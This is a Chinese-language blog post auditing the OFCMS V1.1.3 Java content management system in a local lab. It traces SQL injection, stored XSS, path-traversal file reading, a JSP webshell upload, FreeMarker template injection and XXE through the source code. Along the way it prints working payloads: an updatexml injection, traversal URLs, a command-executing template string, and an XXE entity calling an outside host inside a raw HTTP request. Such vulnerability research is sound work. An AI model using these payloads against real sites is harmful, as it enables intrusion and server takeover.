#  记一次某CMS平台最最最详细的代码审计  
 蚁景网安   2025-07-21 08:47  
  
##### 前言  
  
刚好遇到一个授权的渗透是通过该CMS实现getshell，所以顺便审计一下java类的  
CMS  
，这个管理系统是一个内容管理系统，下载地址  
  
https://gitee.com/oufu/ofcms/tree/V1.1.3/  
  
tomcat下载地址  
> https://dlcdn.apache.org/tomcat/tomcat-8/v8.5.78/bin/apache-tomcat-8.5.78-windows-x64.zip  
  
  
这里我选择8.5.78  
##### 环境搭建  
```
ideaofcms V1.1.3tomcat 8.5
```  
  
idea直接创建新建项目，自动导入xml文件，配置启动服务器  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwOX5vY4gZ8bLE4RCXuvTokB5JWia9Ribtb84moVPgkqPibsXRdxU0XxHjA/640?wx_fmt=png "")  
  
导入sql文件  
```
mysql -uroot -pxxxxxxxuse ofcmssource /路径.ofcms-v1.1.3.sql
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7Pwiab5icp8d68WviaNBJFkvk7VfeU4pbRPNXbuQkKPSQnb6hicYdm3bT7hsA/640?wx_fmt=png "")  
```
show tables;
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwIYBrWOFlYZqn4rZfeIricvHiak1T02aXF0Z1dg3k2CV9X8YA7IYHqs2g/640?wx_fmt=png "")  
  
这里需要注意一点儿，源码确实，无法打包war'包，解决不掉artifacts的问题  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7Pwxb2Ejs1Lia9EI9a4UCT4UL2mds3UWXpiaVQKRXEl54O1QXkhrJXvUGmQ/640?wx_fmt=png "")  
  
配置端口  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwtjVrehcKmhpAGibooCLyOQiciaBHpphyLefNCw03QY5kictlp1qtyUxfeQ/640?wx_fmt=png "")  
  
启动tomgcat的时候会乱码，修改tomcat的配置文件tomcat->config->logging.properties  
  
更改所有utf8  
的格式为GBK  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwT5hNHVr4HcgadupMDibh2s2aLQJiabDAyEdiaPQO3SibXWUmXtSR2cA4gg/640?wx_fmt=png "")  
  
配置maven，整一个恶心的想吐  
```
<mirror>      <id>alimaven</id>      <mirrorOf>central</mirrorOf>      <name>aliyun maven</name>      <url>http://maven.aliyun.com/nexus/content/repositories/central/</url>    </mirror>
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwTp0NzANJwJIibXChCLic9Bxf2BiakKI2ZWb1axC8f9eD77Ee8Ra3IiaZmQ/640?wx_fmt=png "")  
  
重建项目  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwEO9f5HvGUVjDm9z8QEc1ExoG9ia8Nlnq35dAGVvTXp0UAXic1taWbN4Q/640?wx_fmt=png "")  
  
启动服务，但是之前需要修改配置文件中的数据库的连接的字段用户名和密码，这里会报错，所以修改配置文件直接创建完成了数据库在上面导入数据库的时候跳过安装步骤。  
```
首页地址: localhost:8099/ofcms_admin后台地址：localhost:8099/ofcms_admin/admin/login.htmladmin/123456
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwFhD0dVebM7JmtlzdSeZcTHYaFMqIjibDW8HLq8HQ2eEaCluXTPicVEhg/640?wx_fmt=png "")  
##### 审计分析  
###### SQL注入  
  
文件结构目录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwRYElAkZDbVoYyOsiaoMPiarpRhPiaPXHy3U4NqeE6OicXEVwge3TEzj8tg/640?wx_fmt=png "")  
  
因为已知漏洞都存在于后台，直接审计后台文件，首先定位到控制层代码，  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7Pw9EOvt309mzuotZmEzqqCfZZ088L0be2JXgJtBAE5T6sRla1xKoIybA/640?wx_fmt=png "")  
  
因为已经不通通过安装启动web服务，这里不需要分析安装控制层，看首页  
  
出于对代码的尊重，跟了一波增加sql语句的处理，但是存在sql注入的过滤器，  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwUPsZx9I0WMReRzsNQpNXLInqraxt8BnFapZicHa4kK5Pcu1MvibOhtDw/640?wx_fmt=png "")  
  
直接触发增加用户接口  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwLv8gLmdUL7Zk8DhpBcgIKXEbRCnHr5pXCq8vCpMppvc0JxUxMhXypA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwIWJRoarUpEYmedRY6ZUl6VVZ0UYrSf7J87lqCP1wwUarIeYaBSfv4w/640?wx_fmt=png "")  
  
其实可以直接看出来，在第50行的时候已经使用put方法增加了管理员用户，然后new了一个对象record  
存放存入的其它参数的数据,再往下的时候根据record  
的值判断用户的类型，向下56行F7跟进，一直跟到类sqlpara的setsql方法进行插入  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7Pwpmefb0JUIAts6p5E0nyMuAIia4ib2lml5Q05c9n72OM8eJiaJyxJlkLjA/640?wx_fmt=png "")  
  
在这里的时候插入的是创建时的创建时间等字段，并没插入我们传入的详细信息，但是在类sysusercontroller  
中的57行中十对创建的用户sss  
创建id编号，此时用户以及数据的插入时在58行执行结束时完成，已经写进了数据库。  
  
但是这里没有测试存在注入点儿  
，注入点存在于代码生成  
->新增  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwkyE2pxFzGkhpK2XEavgUoHs58O1z9MAnMzG7lDOVWbAblgHdzZ1pJw/640?wx_fmt=png "")  
  
手动测试有回显sql=1'  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwaAev8ia5l9AqiaYvuKWbHgiaiccrPrMDh1RC1TZWFiaAH39Ejv81oU6UGbg/640?wx_fmt=png "")  
  
猜测可能存在报错注入，构造payload  
  
update of_cms_api set api_name=updatexml(1,concat(0x7e,(user())),0) where api_id=2  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwIM3ibSoHpkLSxywCH44AS0D2pwJLlueupaQ6YyhNcDMQIib83oSfWEZA/640?wx_fmt=png "")  
  
\ofsoft\cms\admin\controller\system\SystemGenerateController.java  
下断点分析  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwVzyz3jZK9gYDRjrfr2iaw4HcSTMHGpwJibuUgXbAkF5oGHKhNN0nLZAQ/640?wx_fmt=png "")  
  
47行，F7跟进  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwZax57KLKhib6L2tQgHsicKnJnYz6QtSLp9iaYGGYlegEOPvLACsL4o8BA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwvfHicwEHP2832N3iaHUIMurjN9VQ4yqCiaHUicU6qlgsxc7kpibicx0jmNGA/640?wx_fmt=png "")  
  
返回的sql参数的内容未作任何过滤，48行F7跟进  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwGmtthxak8qgnEhOmw1tc7UqJPOO7uKdhricmL4kVJMhDe8q5enTVzYw/640?wx_fmt=png "")  
  
98行跟进update方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwwiaDKamXRxv5J0ULjYkMp56mkGSoicYRo5zMuIXjhgZD0Opb4AvWQdicQ/640?wx_fmt=png "")  
  
256行直接连接数据库进行更新，最后抛出异常，报错回显出数据库用户名root  
###### 存储型XSS  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwGNYwic2qfxRLoQiaKFvsT0A6QmeJN6VZGA3ibtsqnP7yFBFblU0shKiaEA/640?wx_fmt=png "")  
  
分析代码，  
  
所以这里出现存储型XSS的地方不止这一个触点儿,包括前台，Ueditor编辑器的原因。  
###### 任意文件读取  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwWnv8uMUzHgkCPK9G9LnPrN9uNAcX6rOudozlWOIY4WAdzFzEQrawLA/640?wx_fmt=png "")  
  
查看文件模板，模板文件连接如下  
```
http://localhost:8099/ofcms_admin/admin/cms/template/getTemplates.html?file_name=contact.html&dir=/&dir_name=/
```  
  
可控参数dir  
,payload如下  
```
http://localhost:8099/ofcms_admin/admin/cms/template/getTemplates.html?file_name=contact.html&dir=../../../&dir_name=/
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwLX66sh2k7VzDHicGictbTzGyl0iawjKGKibzyesKEgEhTKYm5Hj7DTqZ0g/640?wx_fmt=png "")  
  
控制字段file_name  
读取文件  
```
http://localhost:8099/ofcms_admin/admin/cms/template/getTemplates.html?file_name=jquery-1.10.1.min.js&dir=../../..//resource/default/static/lib&dir_name=/lib
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwNgmA4mQ4SYuqPiagmS9DdTYl6cEFeuibK9JpuBEKajI0OjTS15jSia7Wg/640?wx_fmt=png "")  
  
漏洞分析  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwXIJjl3YaDUrzI1uNjO0ibkkjQPyOMqOmr1G4Ev9icXuo7z7TRJhic7YCQ/640?wx_fmt=png "")  
  
查看模板文件的时候，传入的dir参数以及updir的参数都为空  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7Pwg1G3N2GOJCh9PL3tef8Bbic4TNvNIBGPeItTLDBdeNS9siaj3fpHEWeQ/640?wx_fmt=png "")  
  
  
  
这里是对路径文件类型做判断，读取模板文件，所这里任意文件读取也只是针对任意模板文件读取，读取文件名的控制参数数为filename  
  
根据debug分析，当传入的payload为  
```
http://localhost:8099/ofcms_admin/admin/cms/template/getTemplates.html?dir=../
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwrQibRjh90Jzs3BTkmvcqJV3EeRibiauhppsDAwawCyR9G3CXCgjhbXdcQ/640?wx_fmt=png "")  
  
测试根据断点看出，我们传入的参数dir为../  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwNb5gaib7ItTXEQmJ8ibVe23G24ibg0FiarEicIquMeMQiaichJa5S1cQQCd7w/640?wx_fmt=png "")  
  
在65行的时候未对传入的参数dir做过滤，这个时候已经拿到了模板目录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwsnLkwJDUXLuJBMusPUrL3ZDPHdLUnWJeftS2icl03PPd9OqTRdiacP2A/640?wx_fmt=png "")  
  
读取通过循环遍历使用文件名读取  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwOfrpuBEbwDORaRKGPf6RMcIibgpSeOyvoibnxvFPmibtwjdLhBYp59MpA/640?wx_fmt=png "")  
  
在调试的时候发现，我们访问目录。这里访问comn  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7Pwo21QaPicsQgEsBNZsjd04b6zYwJfdziayibA4eJYqqNyOmdnvqXqHPnibg/640?wx_fmt=png "")  
  
在控制层TemplateController内调用函数getSiteTemplatePath()  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwiaRWicyuXR3rZlsfzXPl6xaJwTp7j9ucicuMSTkZD8eN2UpT3Xr2hKhJA/640?wx_fmt=png "")  
  
F7跟进，在类file.java中对路径进行了直接拼接  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwiclvQbfEbxDpKV0q923EibH5MZDmgqT1SNdsvnpRKOeeF8FqjcpHniaeA/640?wx_fmt=png "")  
  
所以只要调用file函数拼接的参数也必定会产生"任意"文件读取。那么所能使用的payload如下  
```
?dir=../?up_dir=../#含文件名?file_name=page.html&up_dir=../comn?file_name=page.html&dir=../comn
```  
###### 文件上传实现webshell  
  
刚好该类这里又save方法调用了上面的函数，所以我们可以保证我们上传文件的路径是可控的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwrXgBhuODecQm1O55SClxQiaMfBbSaaiclNlWlmRjFp7SUo3H90fDVUkw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7Pwiady2riapjSW3PU0Id8M7Q2sVhTbic3utKOusY4bDWCxdJN3lRECUicJcA/640?wx_fmt=png "")  
  
尝试构造数据包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwZxMrcDA15IlDp5sE0Uic3KBQAGdibaicSORE4Pic1SJ89PsoSJafcVaaDA/640?wx_fmt=png "")  
  
  
此时已经成功保存，但是通过文件读取是读不到文件的，实际上已经写进去了，因为在读取文件的时候限制了读取的文件类型，可以尝试保存一个html  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwYNlItnXndZvxvjwgzo7DCFa3PBejsibjYBJhKNyRrl7KjX1whlyF2Cg/640?wx_fmt=png "")  
  
验证是可以写入的，那么直接写入jsp木马实现webshell  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwCjf9grzkkibKelN9ibhbL5Pcpa71jZdCmqXAtkMaicTL9Ycn0ttoVdicdg/640?wx_fmt=png "")  
  
最后一个断点执行结束，此时shell已成功写入  
```
http://localhost:8099/ofcms_admin/static/1.jsp
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwQWAyGJ1aCibnzfEIdgHLobJbcnZtfcCyyIFg1PXvcx1yXN2yKpc0Ldw/640?wx_fmt=png "")  
###### SSTI模板注入  
  
同样在save模板的时候我们分析，在125行的时候传入file文件以及文件内容  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwEkPhyughEaVdbVERFmGmSXy2IGsILJjP1ibO8xCOicCmQcwdShsT4XXQ/640?wx_fmt=png "")  
  
f7跟进函数，发现在类fileutils中的，writestring方法中在78行的时候拿到的string还是我们在前端输入的内容  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7Pwicia2mN6rfXxflDlQcVb8nm2YrZ1IibDXnPxmb1q6BKYvkYiacMwgCQBFA/640?wx_fmt=png "")  
  
继续F7跟进函数  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwlK4M29xyoA5Nbp4zI9C8FQm41edv9DtpFiaf2zKJaHUFz8hqCBO4BWw/640?wx_fmt=png "")  
  
这里直接对string进行了编码  
  
payload  
```
<#assign value="freemarker.template.utility.Execute"?new()>${value("calc.exe")}
```  
  
访问  
> http://localhost:8099/ofcms_admin/about.html  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7Pwf4dVXYeWNtXuXkE9fDbcxiaIERgEPv1IVn3kiby1LRgXoXNjIu1AEL5g/640?wx_fmt=png "")  
  
所以这里漏洞的触发点也很多，html页面都可以，当然也可以利用上面的文件上传进行写入页面调用也可以触发。漏洞的触发原理可参考这个文章  
  
http://t.zoukankan.com/Eleven-Liu-p-12747908.html  
  
很清晰  
###### XXE漏洞  
  
直接分析漏洞代码下断点  
  
ofcms-V1.1.3\ofcms-admin\src\main\java\com\ofsoft\cms\admin\controller\ReprotAction.java  
  
前端功能模块导出  
  
定位到控制器处理方法，在 com.ofsoft.cms.admin.controller.ReprotAction   
类的 expReport 方法中。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwtH839h22EV52mzqKVKGrknqeNBZ6ZNQKGdtNGgX32zqx8pOUqlReIw/640?wx_fmt=png "")  
  
使用上文的任意文件读取，在静态页面下放入我们写入的jrxml文件，文件命名为xxe.jrxml  
,构造payload  
```
POST /ofcms_admin/admin/cms/template/save.json HTTP/1.1Host: localhost:8099User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 394Origin: http://localhost:8099Connection: closeReferer: http://localhost:8099/ofcms_admin/admin/cms/template/getTemplates.htmlCookie: JSESSIONID=FCF2920F5C1C3ECAC592420888B66674; Phpstorm-63ee32fd=c3d51684-64a8-4398-bce8-86b8077fb103; XDEBUG_SESSION=XDEBUG_ECLIPSEfile_path=G%3A%5Cofcms113%5Capache-tomcat-8.5.78%5Cwebapps%5Cofcms_admin%5CWEB-INF%5Cpage%5Cdefault%5Cindex.html&dirs=%2F&res_path=&file_name=index.html&file_content=%3c%21%44%4f%43%54%59%50%45%20%70%6f%65%6d%20%5b%3c%21%45%4e%54%49%54%59%20%25%20%78%78%65%20%53%59%53%54%45%4d%20%22%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%36%36%2e%31%32%38%3a%38%30%38%31%22%3e%25%78%78%65%3b%20%5d%3e
```  
  
文件内容的payload  
```
<!DOCTYPE poem [<!ENTITY % xxe SYSTEM "http://192.168.166.128:8081">%xxe; ]>
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwhpwWzbSlVl6ZWDW1Q7ickx39MSxpjpqmqd0unL7Fq3pxHyZJ1GjjOpw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwkMIlY7XrXvOia6ckKicS7iclBRIrt9VNQ2Pu671vFtVC9wwxFLZMFdXIg/640?wx_fmt=png "")  
  
  
直接访问  
```
http://localhost:8099/ofcms_admin/admin/reprot/expReport.html?%20j=../../static/xxe
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7Pwjo5guERMYOAmEtTyfA9wWEcN6c6PIYTiaef7yVoQNY6gq3M3GibDzqow/640?wx_fmt=png "")  
  
  
  
漏洞成因是调用了 getParamsMap 方法，获取用户提交的所有参数，并将 j 参数赋值给 jrxmlFileName ，服务器接收用户输入的 j 参数后，拼接生成文件路径，可直接穿越其它目录，但是限制了文件后缀为 jrxml，所以文件名命名为jrxml  
  
先调用getParamsMap 方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwUQAEOMVeafYTTHnuoibtNqNewibZNn6toaEC8IkWA4jibqeyf9lKTJzhw/640?wx_fmt=png "")  
  
而后调用JasperCompileManager.compileReport() 方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfS09OZHwNm65tkwiayWI7PwIic2fCkL8UeYLhovoXcDKCOxMnZL12OaX997Yxw3xGBl9IQxLYgv4mg/640?wx_fmt=png "")  
  
  
F7跟进，在 compile方法中调用 JRXmlLoader.load() 方法，F7跟进,在 loadXML 方法中调用了 Digester 类的 parse 解析我们的 XML 文档对象，默认是没有禁用外部实体解析，所以xxe文件能执行。  
##### 总结  
  
抛开白盒审计不说，sql注入实现比较简单，黑盒状态下也可知道用户名实现，跨站类可以通过js类的实现对用户的上线，高危的文件读取和webshell以及xxe，总的来说都是在文件读取目录遍历的基础上实现的，否则对于二次开发的网站抛开任意文件读取这个漏洞来说是无法实现webshell的。  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6iavic0tIJIoZCwKvUYnFFiaibgSm6mrFp1ZjAg4ITRicicuLN88YodIuqtF4DcUs9sruBa0bFLtX59lQQ/640?wx_fmt=gif "")  
  
学习  
网安实战课程  
，戳  
“阅读原文”  
  
